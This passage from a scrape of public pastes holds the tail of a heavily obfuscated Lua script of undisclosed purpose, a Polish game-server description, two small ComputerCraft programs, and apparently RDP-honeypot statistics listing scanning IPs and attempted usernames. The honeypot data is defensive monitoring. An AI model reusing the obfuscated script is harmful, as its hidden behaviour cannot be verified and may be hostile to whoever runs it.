10865768-809414 or 1020747-(-387833)else x=7098167438756-(-401221)P=n[I[-829213-(-829214)]]s=n[I[-441066+441068]]g=X(-888130+942780)F=651847+12445284344924 H=s(g,F)T=P[H]F=X(-334923+389502)B=11208002-70129 V=i[T]s=n[I[524989-524988]]H=n[I[-515770+515772]]g=H(F,x)P=s[g]T=X(-187300+241949)T=V[T]T=T(V,P)U=T end else if B<-1018429+15630301 then A=Z B=A and 697574+940515 or-844082+15020740 else A=nil n[I[-493275-(-493280)]]=Z B=778952+4685648 end end else if B<-291666+14931365 then if B<558412+14061632 then B=true B=1032927+4226810 else i=n[I[498807+-498806]]a=X(-139458-(-194352))U=n[I[-358463-(-358465)]]B=444448+5631681 T=X(611872-556998)P=21674595281557-(-97496)a=A[a]V=U(T,P)m=i[V]a=a(A,m)f=not a Z=f end else O=821972-821971 n[D]=q6 j=n[w]W=j+O N=R[W]z=s+N N=238941-238685 B=z%N W=n[p]s=B N=H+W W=-355023+355279 B=-442713+6654190 z=N%W H=z end end end end end else if B<861277+15071137 then if B<15580344-225807 then if B<-220959+15220752 then if B<-679116+15514918 then if B<14156922-(-611041)then if B<14520107-(-212347)then g=X(-17028-(-71546))P=n[I[-436345+436346]]s=n[I[125908-125906]]F=-5407+7740873859891 H=s(g,F)T=P[H]B=10708032-(-871305)V=i[T]T=X(-263026-(-317675))F=X(-218593+273256)s=n[I[306338-306337]]H=n[I[102632-102630]]x=893683+1750011240507 g=H(F,x)T=V[T]P=s[g]T=T(V,P)U=T else D=B m=X(192736+-138019)P=945072+23168141590132 a=q[m]i=n[I[426638+-426637]]T=X(-91798-(-146380))U=n[I[-248117+248119]]V=U(T,P)m=i[V]f=a[m]i=n[I[-59070+59071]]P=13357734432820-(-903192)a=X(608536-553887)T=X(809258+-754341)U=n[I[140474-140472]]a=f[a]V=U(T,P)m=i[V]a=a(f,m)B=a and 975536+10115153 or 363905+-56088 A=a end else if B<15253394-461262 then B=240266+11669173 D=n[I[-917981-(-917983)]]f=n[I[982282+-982279]]A=D==f Z=A else V=X(634737+-580088)m=f P=n[I[-628587+628588]]F=-357385+13567236689078 s=n[I[472991-472989]]V=i[V]g=X(-953116-(-1008070))H=s(g,F)T=P[H]V=V(i,T)B=V and-424190+14914421 or 10432694-(-705179)U=V end end else if B<14435015-(-530259)then if B<14179271-(-679270)then A=Z B=A and 732621+121714 or-384954+6044166 else B=715519-22899 D=nil end else if B<-138556+15111891 then Z={}A=nil B=q[X(-278166+333098)]else V=n[I[-509364-(-509365)]]H=31539319313462-858840 s=X(738769-684077)T=n[I[-411392-(-411394)]]P=T(s,H)U=V[P]i=f[U]B=1542619-(-187531)a=i end end end else if B<170290+15101013 then if B<-668810+15854570 then if B<-635021+15767104 then x=1405242054618-791884 F=X(-635850+690451)s=n[I[-105398+105400]]H=n[I[66249+-66246]]g=H(F,x)c=24042851876305-545302 P=s[g]x=X(-290931+345634)T=U[P]H=n[I[208090-208088]]g=n[I[921177+-921174]]P=X(-497279-(-551928))F=g(x,c)P=T[P]s=H[F]B=-128346+1357982 P=P(T,s)V=P else B=-431524+15844213 end else if B<-776391+16015632 then i=X(999398-944624)i=D[i]Z=X(71378-16591)B=q[Z]m={i(D)}i={B(J(m))}a=i[-193655-(-193658)]Z=i[-924542-(-924543)]m=Z f=i[203668+-203666]B=163273+3916967 else i=X(-603548-(-658470))U=21741726795711-122931 B=n[I[77987+-77982]]V=X(-327977+382672)f=n[I[-716679-(-716681)]]a=n[I[128323+-128320]]m=a(i,U)D=f[m]Z=B(D)f=X(812978+-758261)D=q[f]f=X(264001+-209352)T=4853900738148-(-346736)m=n[I[-776765+776767]]i=n[I[-652757+652760]]f=D[f]U=i(V,T)a=m[U]f=f(D,a)B=f and-588517+4423969 or 1721895-(-1033095)Z=f end end else if B<634118+14702100 then if B<309448+15002958 then B=n[I[-477125-(-477126)]]V=472530-472530 D=f T=727810-727555 U=B(V,T)A[D]=U B=9273225-(-244498)D=nil else f,i=a(D,f)B=f and 14605773-754344 or 4048464-948991 end else Z=X(-408094+463094)B=q[Z]a=n[I[-662012+662015]]m={B(a)}Z=m[110938-110937]B=9192417-(-715844)a=Z D=m[-196512-(-196514)]f=m[1027055-1027052]end end end else if B<-833427+16463079 then if B<189694+15250243 then if B<15908410-504323 then if B<706135+14661939 then B=q[X(-88003+142527)]Z={}A=nil else D=Z B=D and-228822+11519360 or 7821667-(-696373)end else if B<-466919+15886724 then B=12429976-1014488 D=nil else t=n[D]c=t B=t and 752452-(-113472)or 1622536-337033 end end else if B<680865+14899374 then if B<-1007844+16532505 then B={}V=X(-453309-(-508094))m=640444+35184371448388 U=-360510-(-360765)n[I[-278106-(-278108)]]=B Z=n[I[-781383-(-781386)]]a=Z Z=D%m n[I[-558836-(-558840)]]=Z B=215805+5740440 i=D%U U=-342637+342639 m=i+U n[I[-445036-(-445041)]]=m U=q[V]V=X(-484568-(-539560))i=U[V]U=i(A)i=X(-755529+810054)f[D]=i i=-627993+628019 T=U V=-456612+456613 P=587828-587827 s=P P=618459+-618459 H=s<P P=V-s else D=X(608137-553420)V=20262579040621-(-78702)A=q[D]U=X(338605-283666)a=n[I[488185-488184]]m=n[I[-901371-(-901373)]]i=m(U,V)D=X(-62526+117175)f=a[i]D=A[D]D=D(A,f)B=D and 15331422-859672 or 14889252-453697 Z=D end else B=16079376-(-253316)x=#g e=-224447+224447 F=x==e end end else if B<170623+15603626 then if B<898343+14735599 then if B<-703912+16336525 then B=n[I[-183597-(-183603)]]V=B(U)B=241177+6471312 else B=Z and 9102719-926481 or 10715561-(-565934)end else if B<495401+15140818 then B=n[I[57623+-57617]]V=B(U)B=12030368-606000 else B=n[I[-488485-(-488486)]]f=n[I[459918-459916]]i=X(-143124+197643)a=n[I[-588487+588490]]U=17251778573788-628347 m=a(i,U)D=f[m]f=Y(-676661+14813755,{I[-925340-(-925342)],I[-1006640-(-1006643)],I[8129-8125]})Z=B(D,f)B=5019667-180973 end end else if B<324629+15581603 then if B<-1044199+16919401 then D=Z B=D and 4533268-1031125 or 15438131-25442 else B=2244252-262583 end else B=X(-376197+430846)i=a B=D[B]B=B(D,U)V=B B=V and 206837+2934477 or 12559091-(-74028)end end end end else if B<15699902-(-634083)then if B<15696058-(-456997)then if B<16882585-872513 then if B<752950+15199501 then if B<15452737-(-486604)then a,U=m(f,a)B=a and 7749228-959340 or-471734+7962301 else q6=n[D]B=q6 and 10812750-(-702825)or 13828507-(-108811)Z=q6 end else if B<-961163+16939642 then A=k[-871572-(-871573)]B=A and 15217754-(-495136)or-12594+9302184 else V=n[I[-782350+782351]]T=n[I[564006+-564004]]m=f s=X(-300860-(-355855))B=X(801283+-746389)H=26066014399576-(-803601)P=T(s,H)B=i[B]U=V[P]B=B(i,U)B=B and 16950199-454896 or 284472+2911963 end end else if B<-144455+16249076 then if B<15228618-(-847055)then A=Z B=A and-471763+3327948 or-714083+1686030 else s=X(742519-688054)B=n[I[-375882-(-375886)]]x=X(874383-819814)P=q[s]c=5652447070091-(-49853)H=n[I[-107900+107901]]g=n[I[-250786-(-250788)]]F=g(x,c)s=H[F]T=P[s]s=839331+-839076 H=-989215-(-989343)g=1009116+-1008861 P={T(s,H,g)}V=B(U,i,J(P))B=4283763-158715 end else x=675977+9652565115141 P=n[I[-1036992-(-1036993)]]F=5275990532774-153870 g=X(-755156+809944)s=n[I[-471169-(-471171)]]H=s(g,F)B=12916707-245991 T=P[H]V=i[T]T=X(-10838-(-65732))T=V[T]s=n[I[-40096+40097]]H=n[I[828222+-828220]]F=X(36744-(-18062))g=H(F,x)P=s[g]T=T(V,P)U=T end end else if B<243071+16027049 then if B<-483697+16713195 then if B<15299295-(-887623)then D=Z B=D and 411308+2812550 or 8300657-539109 else A=Z B=A and-912438+16251470 or 12538+1792418 end else if B<-1002936+17246489 then i=X(-308045-(-362762))s=28177581950557-(-60644)m=q[i]U=n[I[984421-984420]]P=X(-762137-(-817090))V=n[I[-977022-(-977024)]]T=V(P,s)i=U[T]a=m[i]i=n[I[-494024-(-494025)]]B=760018-(-77013)T=X(996624+-941876)U=n[I[546497-546495]]P=8913+2505568330173 V=U(T,P)m=i[V]P=34325078366408-(-681383)T=X(678578+-624050)f=a[m]i=n[I[-294983-(-294984)]]U=n[I[953542+-953540]]a=X(56523-1874)V=U(T,P)m=i[V]a=f[a]a=a(f,m)A=a else A=k[326922-326921]Z=false B=n[I[-106013+106014]]B[A]=Z A=nil B=q[X(-12381-(-66974))]Z={}end end else if B<-61243+16393683 then if B<16001644-(-309651)then m=X(310120-255403)a=q[m]i=n[I[927128+-927127]]P=774795+106726845862 T=X(-225258+279816)D=B U=n[I[160527+-160525]]V=U(T,P)T=X(-874041+928951)m=i[V]f=a[m]P=23424116561167-(-595340)i=n[I[209327+-209326]]a=X(131215-76566)a=f[a]U=n[I[377044+-377042]]V=U(T,P)m=i[V]a=a(f,m)B=a and-400234+1757312 or 4798489-(-670128)A=a else B=n[I[619358+-619357]]B=B and 7716350-636730 or-876857+9587307 end else B=-679938+14830026 e=#g x=447822+-447821 F=f(x,e)x=i(g,F)F=nil e=n[H]p=685411-685410 L=x-p d=U(L)e[x]=d x=nil end end end else if B<-811803+17347757 then if B<-90144+16579886 then if B<-405133+16826480 then if B<17428986-1024720 then i=-862056+13409659764684 Z=n[I[-858093-(-858094)]]m=X(-127118-(-181848))o=X(420777+-366289)D=n[I[-357962+357964]]U=X(174880-120013)T=28258172375206-171328 V=-396534+1456984756124 f=n[I[-24293+24296]]a=f(m,i)A=D[a]B=Z[A]g=18929964432942-(-582720)i=219209+9513239181572 D=n[I[-219855+219857]]f=n[I[-619918+619921]]m=X(-130238-(-184751))a=f(m,i)x=715154+23372757991665 A=D[a]a=n[I[-961442+961444]]m=n[I[958423-958420]]i=m(U,V)f=a[i]V=X(-711229-(-765958))m=n[I[63135+-63133]]i=n[I[-733028+733031]]U=i(V,T)T=X(821688+-767024)L=16323794801869-685852 Z=X(-428205-(-482705))a=m[U]i=n[I[-620603-(-620605)]]U=n[I[553010+-553007]]P=375772+22533428964640 V=U(T,P)Z=B[Z]m=i[V]P=505304+3531858038932 i=false t=700414+6458177215425 U=635435+34075867810768 D={[f]=a,[m]=i}Z=Z(B,A,D)c=X(981500+-926620)A=Z Z=n[I[724699+-724698]]f=n[I[131760-131758]]i=X(271895+-217267)a=n[I[-809884-(-809887)]]m=a(i,U)T=-831720+29603692586689 U=28828459565147-(-46101)D=f[m]s=432850+22230171798941 B=Z[D]f=n[I[-327876-(-327878)]]i=X(-128664-(-183163))a=n[I[448137-448134]]m=a(i,U)D=f[m]m=n[I[805214+-805212]]V=X(267232-212359)i=n[I[-71396-(-71399)]]U=i(V,T)T=X(487356-432557)a=m[U]i=n[I[-295083-(-295085)]]U=n[I[-684738+684741]]V=U(T,P)P=X(-251254+305854)m=i[V]e=-206017+11893465627235 F=X(-746097-(-800861))U=n[I[-107805-(-107807)]]Z=X(210301+-155713)H=17155928979334-219218 V=n[I[294718-294715]]T=V(P,s)i=U[T]V=n[I[-718600-(-718602)]]T=n[I[452711+-452708]]s=X(509224+-454637)P=T(s,H)H=X(1015886-961379)U=V[P]Z=B[Z]T=n[I[-7868-(-7870)]]P=n[I[-113975+113978]]s=P(H,g)V=T[s]T=388055+-388005 s=n[I[368547+-368545]]H=n[I[353447-353444]]g=H(F,x)P=s[g]g=n[I[-901396+901398]]s=-1004801-(-1004817)F=n[I[203661-203658]]x=F(c,t)H=g[x]g=749686+-749486 x=n[I[29078+-29076]]c=n[I[-402544+402547]]t=c(o,e)F=x[t]x=-432219+432219 t=n[I[-920007+920009]]d=X(796777-742140)o=n[I[21923-21920]]e=o(d,L)c=t[e]t=E(-894812+12330169,{I[1019025-1019021],I[-778643+778645],I[-369564+369567]})f={[a]=m;[i]=U,[V]=T,[P]=s;[H]=g;[F]=x;[c]=t}Z=Z(B,D,f)D=Z B=X(489140+-434509)P=631242+22195590088341 U=X(-401682-(-456489))Z=M(13565159-991845,{I[-720458-(-720463)],I[-457905-(-457907)];I[57849-57846],I[388557-388553],I[330214+-330208]})B=A[B]V=19026065019167-241284 B=B(A,Z)Z=n[I[564708+-564707]]a=n[I[-788126-(-788128)]]D=nil m=n[I[26160+-26157]]T=X(-386864-(-441675))i=m(U,V)f=a[i]B=Z[f]a=n[I[-100361-(-100363)]]s=-993550+7219397604911 V=-817971+20886024495408 U=X(-197303-(-251923))m=n[I[-415779-(-415782)]]i=m(U,V)H=977160+5236398940286 f=a[i]i=n[I[-574401-(-574403)]]U=n[I[104572-104569]]V=U(T,P)m=i[V]P=X(230646+-176080)U=n[I[-5098-(-5100)]]Z=X(591254+-536754)V=n[I[892545+-892542]]T=V(P,s)s=X(1027373-972417)i=U[T]Z=B[Z]V=n[I[934701-934699]]T=n[I[-685311-(-685314)]]P=T(s,H)U=V[P]V=false a={[m]=i,[U]=V}Z=Z(B,f,a)a=S()B=nil n[a]=B f=Z Z=b(6863862-(-227505),{a;I[-589827-(-589829)],I[845148-845145]})a=G(a)A=nil B=X(960402-905771)B=f[B]B=B(f,Z)f=nil B=q[X(-449692-(-504185))]Z={}else Z=f B=a B=15515703-(-118114)end else if B<17255341-769152 then Z=X(828722+-773935)i=X(709899+-655125)i=D[i]B=q[Z]m={i(D)}i={B(J(m))}f=i[-474442-(-474444)]Z=i[809555+-809554]B=6500074-716347 m=Z a=i[-614345-(-614348)]else B=-658096+1630043 end end else if B<17121948-590549 then if B<16502839-(-26724)then B=X(-20143+75078)B=i[B]B=B(i)B=3143170-(-53265)else A=Z B=A and 3017878-(-533223)or 10261860-(-184605)end else B=-445753+14497064 end end else if B<16417562-(-345624)then if B<17542114-870094 then if B<17001464-427239 then o=X(274820-220312)B=q[o]d=X(727258-672659)e=q[d]o=B(e)B=X(359321-304781)q[B]=o B=7969840-(-3150)else B=q[X(385838-331265)]Z={}end else if B<459218+16292040 then B=q[X(304713-249951)]A=nil Z={}else i=n[I[622415+-622414]]U=n[I[-1000647+1000649]]T=X(-861465-(-916107))P=275392+32609364166544 V=U(T,P)m=i[V]a=A[m]P=X(-260871-(-315844))U=n[I[-387431+387432]]V=n[I[-800684+800686]]s=5565824090435-(-116956)T=V(P,s)i=U[T]m=X(-229737-(-284437))m=a[m]m=m(a,i)D=m B=1045920+5323239 end end else if B<914118+15852858 then if B<959233+15804404 then B=Z and-946471+7289398 or 8095239-382365 else A=Z B=A and 11168970-(-116838)or-895629+13517422 end else Z=X(-676792-(-731579))m=X(334548+-279774)B=q[Z]m=A[m]a={m(A)}m={B(J(a))}Z=m[156007+-156006]B=925141+8045619 f=m[-185458-(-185461)]a=Z D=m[-748553-(-748555)]end end end end end end end end end B=#K return J(Z)end,function(q,X)local J=f(X)local k=function(k,I,K,Q)return B(q,{k;I,K;Q},X,J)end return k end,function()D=(-899388+899389)+D A[D]=-714351-(-714352)return D end,function(q,X)local J=f(X)local k=function(k,I,K,Q,Z,n)return B(q,{k,I;K,Q;Z,n},X,J)end return k end,function(q,X)local J=f(X)local k=function(k,I,K)return B(q,{k;I,K},X,J)end return k end,function(q,X)local J=f(X)local k=function(...)return B(q,{...},X,J)end return k end,function(q)A[q]=A[q]-(-438548+438549)if A[q]==-140617-(-140617)then A[q],n[q]=nil,nil end end,function(q,X)local J=f(X)local k=function(k)return B(q,{k},X,J)end return k end,function(q,X)local J=f(X)local k=function(k,I)return B(q,{k,I},X,J)end return k end,{},-863443-(-863443)return(m(454088+794027,{}))(J(Z))end)(getfenv and getfenv()or _ENV,unpack or table[X(82966-28083)],newproxy,setmetatable,getmetatable,select,{...})end)(...)"
1JjF5pKb,themepark,Onufrajj,HTML,Friday 11th of July 2025 09:27:54 PM CDT,"<align=center><b><size=200%><color=#56027A>T</color><color=#660392>h</color><color=#7604AA>e</color><color=#8605C2>m</color><color=#9606DA>e</color><color=#04FF00>P</color><color=#04E101>a</color><color=#04C302>r</color><color=#04A503>k</color></size></b>
<align=center><b><size=150%><color=#FF9D14>『</color><color=#FF9527>R</color><color=#FF8D3A>e</color><color=#FF854D>p</color><color=#FF7D60>u</color><color=#FF7573>b</color><color=#FF6D86>l</color><color=#FF6599>i</color><color=#FF5DAC>k</color><color=#FF55BF>a</color><color=#FF4DD2>』</color></size></b>
____________________________________________________________________

<mark=#bc20fa20><color=#bc20fa>ThemePark Republika to serwer przeznaczony dla graczy w dosłownym tego słowa znaczeniu. Wraz ze znajomymi załóż partię, a następnie wstąp w kręgi polityki serwera, walcząc o fotel zarządcy w cyklicznych wyborach!</color></mark>

____________________________________________________________________
<size=30><color=#bc20fa>Regulamin Serwera:</color></size>
<align=left><size=20><color=#3dff5d>1. Zachowaj kulturę i bądź miły w stosunku do innych.
2. Nie reklamuj się bez zgody zarządu.
3. Szanuj poglądy, religie oraz prywatność innych graczy.
4. Nie propaguj poglądów ekstremistycznych (komunizm, nazizm, rasizm itp.)</color></size>
<align=center>____________________________________________________________________
<size=30><color=#bc20fa>Kontakt:</color></size>
<size=15><b><color=#bc20fa>Discord: </color></b></size></color><link=""https://discord.gg/wDPjF25pgF""><color=#3dff5d><u>ThemePark</u></color></link></size></i></b>
____________________________________________________________________
<color=#bc20fa><size=25>Właściciel Sieci:</size></color>
<color=#3dff5d><size=15>onufraj</size></color>
<color=#bc20fa><size=25>Opiekun Serwera:</size></color>
<color=#3dff5d><size=15>cyprian0130</size></color>"
gLwkrsnV,Computercraft - Ender Storage Test Program,Rolcam,Lua,Friday 11th of July 2025 09:05:01 PM CDT,"-- replace these with whatever the peripheral name is. It can vary
tank = peripheral.wrap(""ender_tank_0"")
chest = peripheral.wrap(""ender_chest_0"")

ender = nil

while true do
	term.clear()
	term.setTextColor(colors.yellow)
	term.setCursorPos(1,1)
	print(""Ender Storage Test System"")
	print(""1 - Modify ender chest color"")
	print(""2 - Modify ender tank color"")
	print("" "")
	print(""Please make a selection:"")
	input = read()
	if input == ""1"" then
		ender = chest        
	elseif input == ""2"" then
        ender = tank
	else
        term.setTextColor(colors.red)
		print(""Invalid Selection! Please try again."")
        sleep(2)
	end
    if ender ~= nil then
        term.setTextColor(colors.purple)
        term.clear()
        term.setCursorPos(1,1)
        print(""Please enter the value for the first color."")
        print(""We will not validate these values!"")
        print(""Please use numberic values only"")
        col1 = read()
        term.clear()
        term.setCursorPos(1,1)
        print(""Please enter the value for the second color."")
        print(""We will not validate these values!"")
        print(""Please use numberic values only"")
        col2 = read()
        term.clear()
        term.setCursorPos(1,1)
        print(""Please enter the value for the third color."")
        print(""We will not validate these values!"")
        print(""Please use numberic values only"")
        col3 = read()
        term.clear()
        term.setCursorPos(1,1)
        print(""Setting color band..."")
        ender.setColors(tonumber(col1), tonumber(col2), tonumber(col3) )
    end
end"
17SCD3Zr,Computercraft - Terminal Glasses Full Screen Test,Rolcam,Lua,Friday 11th of July 2025 08:30:23 PM CDT,"-- This is a joke program. Please don't use this for in-game evil


-- Side the glasses bridge is on
glass = peripheral.wrap(""top"")

for i = 0, 1, 0.1 do
    glass.clear()
    glass.addBox(0, 0, 1000, 1000, 0x000000, i)
    sleep(0.1)
end

glass.addText(100, 100,""Buy this thing!"", 0xFFFFFF)
glass.addText(100, 110,""For ONLY $9.99*"", 0xFFFFFF)
glass.addText(100, 150,""*Per minute for eternity"", 0xFFFFFF)
glass.addIcon(200, 100, 1081, 1)

for k = 10, 1, -1 do
    glass.addBox(99, 169, 1000, 1000, 0x000000, 1)
    glass.addText(100, 170,""This ad will close in "" .. k .. "" seconds      "", 0xFFFFFF)
	sleep(1)
end

glass.clear()"
hwXWQ8Yv,2025-07-11_stats.json,rdp_snitch,JSON,Friday 11th of July 2025 07:18:00 PM CDT,"{
  ""ip"": {
    ""41.193.161.242"": 3,
    ""195.3.223.186"": 3,
    ""167.94.146.56"": 3,
    ""172.233.253.134"": 15,
    ""198.235.24.172"": 9,
    ""138.68.188.52"": 3,
    ""45.146.130.128"": 6,
    ""109.160.70.30"": 3,
    ""203.55.131.5"": 30,
    ""161.35.8.106"": 3,
    ""198.235.24.186"": 9,
    ""194.180.49.127"": 6,
    ""103.189.201.66"": 6,
    ""198.235.24.128"": 9,
    ""68.183.178.139"": 6,
    ""161.35.215.131"": 657,
    ""152.53.183.227"": 3,
    ""162.210.245.77"": 6,
    ""68.183.175.233"": 12,
    ""162.142.125.125"": 3,
    ""102.88.21.216"": 3,
    ""159.89.148.157"": 3,
    ""147.185.132.27"": 9
  },
  ""asn"": {
    ""AS11845"": 3,
    ""AS201814"": 9,
    ""AS398705"": 3,
    ""AS63949"": 15,
    ""AS396982"": 36,
    ""AS14061"": 684,
    ""AS213790"": 6,
    ""AS44247"": 3,
    ""AS50219"": 30,
    ""AS9341"": 6,
    ""AS197540"": 3,
    ""AS397651"": 6,
    ""AS398324"": 3,
    ""AS29465"": 3
  },
  ""isp"": {
    ""Vox Telecommunications PTY Ltd"": 3,
    ""MEVSPACE sp. z o.o."": 9,
    ""Censys, Inc."": 6,
    ""Akamai Technologies, Inc."": 15,
    ""Google LLC"": 36,
    ""DigitalOcean, LLC"": 684,
    ""Limited Network LTD"": 6,
    ""Videosat09 GCN"": 3,
    ""LNK SYSTEMS MUNTENIA SRL"": 30,
    ""PT INDONESIA COMNETS PLUS"": 6,
    ""netcup GmbH"": 3,
    ""RCI Broadband"": 6,
    ""MTN NIGERIA Communication limited"": 3
  },
  ""org"": {
    ""Vox Telecom (Pty) Ltd"": 3,
    ""MEVSPACE sp. z o.o"": 3,
    ""Censys, Inc."": 3,
    ""Akamai Technologies, Inc."": 15,
    ""Palo Alto Networks, Inc"": 36,
    ""DigitalOcean, LLC"": 684,
    ""Limited Network LTD"": 6,
    ""Unknown"": 9,
    ""Valence Technology Co"": 30,
    ""HostSlick"": 6,
    ""netcup GmbH"": 3,
    ""10x Servers"": 6,
    ""Censys Inc"": 3,
    ""MTN Nigeria"": 3
  },
  ""regionName"": {
    ""Western Cape"": 3,
    ""Mazovia"": 3,
    ""Hesse"": 660,
    ""\u00cele-de-France"": 15,
    ""California"": 51,
    ""England"": 3,
    ""Federal District"": 6,
    ""Veliko Tarnovo"": 3,
    ""North Holland"": 30,
    ""New Jersey"": 3,
    ""Bavaria"": 6,
    ""East Java"": 6,
    ""South West"": 6,
    ""Baden-Wurttemberg"": 3,
    ""Virginia"": 6,
    ""Michigan"": 3,
    ""Lagos"": 3
  },
  ""country"": {
    ""South Africa"": 3,
    ""Poland"": 3,
    ""Germany"": 669,
    ""France"": 15,
    ""United States"": 63,
    ""United Kingdom"": 3,
    ""Brazil"": 6,
    ""Bulgaria"": 3,
    ""The Netherlands"": 30,
    ""Indonesia"": 6,
    ""Singapore"": 6,
    ""Nigeria"": 3
  },
  ""account"": {
    ""hello"": 705,
    ""Administr"": 3,
    ""(empty)"": 6,
    ""ObtrTMCXG"": 3,
    ""uteKUF"": 3,
    ""JCjKGS"": 3,
    ""Test"": 12,
    ""eltons"": 15,
    ""administr"": 15,
    ""EMqOWepal"": 3,
    ""xScuQB"": 3,
    ""AURLoF"": 3,
    ""AfviyoJQu"": 3,
    ""kiXpdU"": 3,
    ""UkDsQW"": 3,
    ""142.93.8.59"": 3,
    ""cxda14mx"": 12,
    ""beio"": 3,
    ""wUSJgMgnC"": 3,
    ""aDDBnX"": 3,
    ""UHcJfp"": 3
  },
  ""keyboard"": {
    ""Unknown"": 810
  },
  ""client_build"": {
    ""Unknown"": 810
  },
  ""client_name"": {
    ""Unknown"": 810
  },
  ""ip_type"": {
    ""Unknown"": 57,
    ""hosting"": 732,
    ""proxy"": 12,
    ""hosting & proxy"": 6,
    ""mobile & hosting"": 3
  }
}"
vQW7ap7p,2025-07-11_stats.json,rdp_snitch,JSON,Friday 11th of July 2025 07:16:10 PM CDT,"{
  ""ip"": {
    ""41.193.161.242"": 2,
    ""195.3.223.186"": 2,
    ""167.94.146.56"": 2,
    ""172.233.253.134"": 10,
    ""198.235.24.172"": 6,
    ""138.68.188.52"": 2,
    ""45.146.130.128"": 4,
    ""109.160.70.30"": 2,
    ""203.55.131.5"": 20,
    ""161.35.8.106"": 2,
    ""198.235.24.186"": 6,
    ""194.180.49.127"": 4,
    ""103.189.201.66"": 4,
    ""198.235.24.128"": 6,
    ""68.183.178.139"": 4,
    ""161.35.215.131"": 438,
    ""152.53.183.227"": 2,
    ""162.210.245.77"": 4,
    ""68.183.175.233"": 8,
    ""162.142.125.125"": 2,
    ""102.88.21.216"": 2,
    ""159.89.148.157"": 2,
    ""147.185.132.27"": 6
  },
  ""asn"": {
    ""AS11845"": 2,
    ""AS201814"": 6,
    ""AS398705"": 2,
    ""AS63949"": 10,
    ""AS396982"": 24,
    ""AS14061"": 456,
    ""AS213790"": 4,
    ""AS44247"": 2,
    ""AS50219"": 20,
    ""AS9341"": 4,
    ""AS197540"": 2,
    ""AS397651"": 4,
    ""AS398324"": 2,
    ""AS29465"": 2
  },
  ""isp"": {
    ""Vox Telecommunications PTY Ltd"": 2,
    ""MEVSPACE sp. z o.o."": 6,
    ""Censys, Inc."": 4,
    ""Akamai Technologies, Inc."": 10,
    ""Google LLC"": 24,
    ""DigitalOcean, LLC"": 456,
    ""Limited Network LTD"": 4,
    ""Videosat09 GCN"": 2,
    ""LNK SYSTEMS MUNTENIA SRL"": 20,
    ""PT INDONESIA COMNETS PLUS"": 4,
    ""netcup GmbH"": 2,
    ""RCI Broadband"": 4,
    ""MTN NIGERIA Communication limited"": 2
  },
  ""org"": {
    ""Vox Telecom (Pty) Ltd"": 2,
    ""MEVSPACE sp. z o.o"": 2,
    ""Censys, Inc."": 2,
    ""Akamai Technologies, Inc."": 10,
    ""Palo Alto Networks, Inc"": 24,
    ""DigitalOcean, LLC"": 456,
    ""Limited Network LTD"": 4,
    ""Unknown"": 6,
    ""Valence Technology Co"": 20,
    ""HostSlick"": 4,
    ""netcup GmbH"": 2,
    ""10x Servers"": 4,
    ""Censys Inc"": 2,
    ""MTN Nigeria"": 2
  },
  ""regionName"": {
    ""Western Cape"": 2,
    ""Mazovia"": 2,
    ""Hesse"": 440,
    ""\u00cele-de-France"": 10,
    ""California"": 34,
    ""England"": 2,
    ""Federal District"": 4,
    ""Veliko Tarnovo"": 2,
    ""North Holland"": 20,
    ""New Jersey"": 2,
    ""Bavaria"": 4,
    ""East Java"": 4,
    ""South West"": 4,
    ""Baden-Wurttemberg"": 2,
    ""Virginia"": 4,
    ""Michigan"": 2,
    ""Lagos"": 2
  },
  ""country"": {
    ""South Africa"": 2,
    ""Poland"": 2,
    ""Germany"": 446,
    ""France"": 10,
    ""United States"": 42,
    ""United Kingdom"": 2,
    ""Brazil"": 4,
    ""Bulgaria"": 2,
    ""The Netherlands"": 20,
    ""Indonesia"": 4,
    ""Singapore"": 4,
    ""Nigeria"": 2
  },
  ""account"": {
    ""hello"": 470,
    ""Administr"": 2,
    ""(empty)"": 4,
    ""ObtrTMCXG"": 2,
    ""uteKUF"": 2,
    ""JCjKGS"": 2,
    ""Test"": 8,
    ""eltons"": 10,
    ""administr"": 10,
    ""EMqOWepal"": 2,
    ""xScuQB"": 2,
    ""AURLoF"": 2,
    ""AfviyoJQu"": 2,
    ""kiXpdU"": 2,
    ""UkDsQW"": 2,
    ""142.93.8.59"": 2,
    ""cxda14mx"": 8,
    ""beio"": 2,
    ""wUSJgMgnC"": 2,
    ""aDDBnX"": 2,
    ""UHcJfp"": 2
  },
  ""keyboard"": {
    ""Unknown"": 540
  },
  ""client_build"": {
    ""Unknown"": 540
  },
  ""client_name"": {
    ""Unknown"": 540
  },
  ""ip_type"": {
    ""Unknown"": 38,
    ""hosting"": 488,
    ""proxy"": 8,
    ""hosting & proxy"": 4,
    ""mobile & hosting"": 2
  }
}"
4zVxSrsw,2025-07-11_stats.json,rdp_snitch,JSON,Friday 11th of July 2025 07:15:10 PM CDT,"{
  ""ip"": {
    ""41.193.161.242"": 1,
    ""195.3.223.186"": 1,
    ""167.94.146.56"": 1,
    ""172.233.253.134"": 5,
    ""198.235.24.172"": 3,
    ""138.68.188.52"": 1,
    ""45.146.130.128"": 2,
    ""109.160.70.30"": 1,
    ""203.55.131.5"": 10,
    ""161.35.8.106"": 1,
    ""198.235.24.186"": 3,
    ""194.180.49.127"": 2,
    ""103.189.201.66"": 2,
    ""198.235.24.128"": 3,
    ""68.183.178.139"": 2,
    ""161.35.215.131"": 219,
    ""152.53.183.227"": 1,
    ""162.210.245.77"": 2,
    ""68.183.175.233"": 4,
    ""162.142.125.125"": 1,
    ""102.88.21.216"": 1,
    ""159.89.148.157"": 1,
    ""147.185.132.27"": 3
  },
  ""asn"": {
    ""AS11845"": 1,
    ""AS201814"": 3,
    ""AS398705"": 1,
    ""AS63949"": 5,
    ""AS396982"": 12,
    ""AS14061"": 228,
    ""AS213790"": 2,
    ""AS44247"": 1,
    ""AS50219"": 10,
    ""AS9341"": 2,
    ""AS197540"": 1,
    ""AS397651"": 2,
    ""AS398324"": 1,
    ""AS29465"": 1
  },
  ""isp"": {
    ""Vox Telecommunications PTY Ltd"": 1,
    ""MEVSPACE sp. z o.o."": 3,
    ""Censys, Inc."": 2,
    ""Akamai Technologies, Inc."": 5,
    ""Google LLC"": 12,
    ""DigitalOcean, LLC"": 228,
    ""Limited Network LTD"": 2,
    ""Videosat09 GCN"": 1,
    ""LNK SYSTEMS MUNTENIA SRL"": 10,
    ""PT INDONESIA COMNETS PLUS"": 2,
    ""netcup GmbH"": 1,
    ""RCI Broadband"": 2,
    ""MTN NIGERIA Communication limited"": 1
  },
  ""org"": {
    ""Vox Telecom (Pty) Ltd"": 1,
    ""MEVSPACE sp. z o.o"": 1,
    ""Censys, Inc."": 1,
    ""Akamai Technologies, Inc."": 5,
    ""Palo Alto Networks, Inc"": 12,
    ""DigitalOcean, LLC"": 228,
